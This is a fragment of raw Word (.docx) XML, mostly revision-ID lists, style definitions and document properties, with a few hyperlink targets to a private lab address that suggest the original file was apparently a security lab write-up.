    <w:rsid w:val="00A933C6"/>
    <w:rsid w:val="00A94E13"/>
    <w:rsid w:val="00A97609"/>
    <w:rsid w:val="00AA0E4F"/>
    <w:rsid w:val="00AA52D6"/>
    <w:rsid w:val="00AA6FA0"/>
    <w:rsid w:val="00AB336D"/>
    <w:rsid w:val="00AB4747"/>
    <w:rsid w:val="00AB7BA9"/>
    <w:rsid w:val="00AC50A5"/>
    <w:rsid w:val="00AD5F3B"/>
    <w:rsid w:val="00AE38BE"/>
    <w:rsid w:val="00AF1BDA"/>
    <w:rsid w:val="00AF6506"/>
    <w:rsid w:val="00B1194E"/>
    <w:rsid w:val="00B217B2"/>
    <w:rsid w:val="00B21939"/>
    <w:rsid w:val="00B21DB3"/>
    <w:rsid w:val="00B2779F"/>
    <w:rsid w:val="00B32558"/>
    <w:rsid w:val="00B3426B"/>
    <w:rsid w:val="00B356FD"/>
    <w:rsid w:val="00B4122A"/>
    <w:rsid w:val="00B45732"/>
    <w:rsid w:val="00B55058"/>
    <w:rsid w:val="00B61312"/>
    <w:rsid w:val="00B64516"/>
    <w:rsid w:val="00B6652E"/>
    <w:rsid w:val="00B72B48"/>
    <w:rsid w:val="00B87474"/>
    <w:rsid w:val="00B87DB2"/>
    <w:rsid w:val="00B910F3"/>
    <w:rsid w:val="00B91CCB"/>
    <w:rsid w:val="00B95B8E"/>
    <w:rsid w:val="00B964A4"/>
    <w:rsid w:val="00B9700C"/>
    <w:rsid w:val="00BA1307"/>
    <w:rsid w:val="00BA4A72"/>
    <w:rsid w:val="00BB5B42"/>
    <w:rsid w:val="00BC3911"/>
    <w:rsid w:val="00BD0C03"/>
    <w:rsid w:val="00BD2740"/>
    <w:rsid w:val="00BD5352"/>
    <w:rsid w:val="00BE333D"/>
    <w:rsid w:val="00BE4FE7"/>
    <w:rsid w:val="00BE644E"/>
    <w:rsid w:val="00BE7726"/>
    <w:rsid w:val="00BF1A7E"/>
    <w:rsid w:val="00C053E5"/>
    <w:rsid w:val="00C0741F"/>
    <w:rsid w:val="00C123D8"/>
    <w:rsid w:val="00C315A6"/>
    <w:rsid w:val="00C4165D"/>
    <w:rsid w:val="00C417EA"/>
    <w:rsid w:val="00C43EEC"/>
    <w:rsid w:val="00C46C35"/>
    <w:rsid w:val="00C50946"/>
    <w:rsid w:val="00C5108F"/>
    <w:rsid w:val="00C51519"/>
    <w:rsid w:val="00C62E1F"/>
    <w:rsid w:val="00C645F3"/>
    <w:rsid w:val="00C64B87"/>
    <w:rsid w:val="00C66518"/>
    <w:rsid w:val="00C67643"/>
    <w:rsid w:val="00C74E59"/>
    <w:rsid w:val="00C75698"/>
    <w:rsid w:val="00C77CD9"/>
    <w:rsid w:val="00C9337A"/>
    <w:rsid w:val="00C95FFA"/>
    <w:rsid w:val="00CA0DF4"/>
    <w:rsid w:val="00CB01A8"/>
    <w:rsid w:val="00CB2EEE"/>
    <w:rsid w:val="00CB30A7"/>
    <w:rsid w:val="00CD29A6"/>
    <w:rsid w:val="00CD38E4"/>
    <w:rsid w:val="00CD5997"/>
    <w:rsid w:val="00CD6C99"/>
    <w:rsid w:val="00CE1135"/>
    <w:rsid w:val="00CE1164"/>
    <w:rsid w:val="00CE6148"/>
    <w:rsid w:val="00CF54B0"/>
    <w:rsid w:val="00CF58E2"/>
    <w:rsid w:val="00CF664A"/>
    <w:rsid w:val="00D0080B"/>
    <w:rsid w:val="00D0568D"/>
    <w:rsid w:val="00D05C54"/>
    <w:rsid w:val="00D0606D"/>
    <w:rsid w:val="00D06DC4"/>
    <w:rsid w:val="00D11A57"/>
    <w:rsid w:val="00D2530B"/>
    <w:rsid w:val="00D26883"/>
    <w:rsid w:val="00D30405"/>
    <w:rsid w:val="00D40418"/>
    <w:rsid w:val="00D41E98"/>
    <w:rsid w:val="00D466C8"/>
    <w:rsid w:val="00D54610"/>
    <w:rsid w:val="00D55247"/>
    <w:rsid w:val="00D610A5"/>
    <w:rsid w:val="00D70F85"/>
    <w:rsid w:val="00D716C2"/>
    <w:rsid w:val="00D93506"/>
    <w:rsid w:val="00DA4DEA"/>
    <w:rsid w:val="00DA54A4"/>
    <w:rsid w:val="00DB1173"/>
    <w:rsid w:val="00DB2912"/>
    <w:rsid w:val="00DB35FC"/>
    <w:rsid w:val="00DB526F"/>
    <w:rsid w:val="00DB79CC"/>
    <w:rsid w:val="00DF5548"/>
    <w:rsid w:val="00DF7C5B"/>
    <w:rsid w:val="00DF7D69"/>
    <w:rsid w:val="00E001A1"/>
    <w:rsid w:val="00E01618"/>
    <w:rsid w:val="00E036CA"/>
    <w:rsid w:val="00E0776C"/>
    <w:rsid w:val="00E17EB0"/>
    <w:rsid w:val="00E2216F"/>
    <w:rsid w:val="00E22248"/>
    <w:rsid w:val="00E25393"/>
    <w:rsid w:val="00E50150"/>
    <w:rsid w:val="00E6142E"/>
    <w:rsid w:val="00E6511A"/>
    <w:rsid w:val="00E66730"/>
    <w:rsid w:val="00E70F16"/>
    <w:rsid w:val="00E75C04"/>
    <w:rsid w:val="00E81759"/>
    <w:rsid w:val="00E840E7"/>
    <w:rsid w:val="00E87B4D"/>
    <w:rsid w:val="00EA21C0"/>
    <w:rsid w:val="00EB68D9"/>
    <w:rsid w:val="00EC60FE"/>
    <w:rsid w:val="00ED12E2"/>
    <w:rsid w:val="00EE6C1B"/>
    <w:rsid w:val="00EF09C3"/>
    <w:rsid w:val="00EF2E2E"/>
    <w:rsid w:val="00EF3EA2"/>
    <w:rsid w:val="00F06D40"/>
    <w:rsid w:val="00F14FFA"/>
    <w:rsid w:val="00F23A05"/>
    <w:rsid w:val="00F256D1"/>
    <w:rsid w:val="00F332DC"/>
    <w:rsid w:val="00F34A7C"/>
    <w:rsid w:val="00F35397"/>
    <w:rsid w:val="00F526BF"/>
    <w:rsid w:val="00F63CB1"/>
    <w:rsid w:val="00F753D4"/>
    <w:rsid w:val="00F757F5"/>
    <w:rsid w:val="00F955B0"/>
    <w:rsid w:val="00F970FE"/>
    <w:rsid w:val="00F971B9"/>
    <w:rsid w:val="00FA34E9"/>
    <w:rsid w:val="00FB289C"/>
    <w:rsid w:val="00FB2CF7"/>
    <w:rsid w:val="00FB332F"/>
    <w:rsid w:val="00FB7496"/>
    <w:rsid w:val="00FC4A32"/>
    <w:rsid w:val="00FC4CFF"/>
    <w:rsid w:val="00FD1EB7"/>
    <w:rsid w:val="00FD2FF1"/>
    <w:rsid w:val="00FD7E6C"/>
    <w:rsid w:val="00FE4A20"/>
    <w:rsid w:val="00FF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C731"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{FC1851C1-1C52-47B8-9F09-36423F8D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7E0"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00251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7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6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61B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D61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C7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91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E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1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ebkit-html-attribute-name">
    <w:name w:val="webkit-html-attribute-name"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00DB2912"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="webkit-html-attribute-value">
    <w:name w:val="webkit-html-attribute-value"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00DB2912"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00FB7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suhada@zerobyte.id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192.168.56.107/admin/dashboard/Files_Backup2024/Credentials.zip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hyperlink" Target="mailto:ichigo@192.168.56.10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03FE4-2207-4A9D-8ABE-E5890B3E8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16</Pages>
  <Words>778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Abdurrohman Al Fathi</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Abdurrohman Al Fathi</cp:lastModifiedBy>
  <cp:revision>425</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-02-21T14:57:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-03-01T16:18:00Z</dcterms:modified>
</cp:coreProperties>
</file>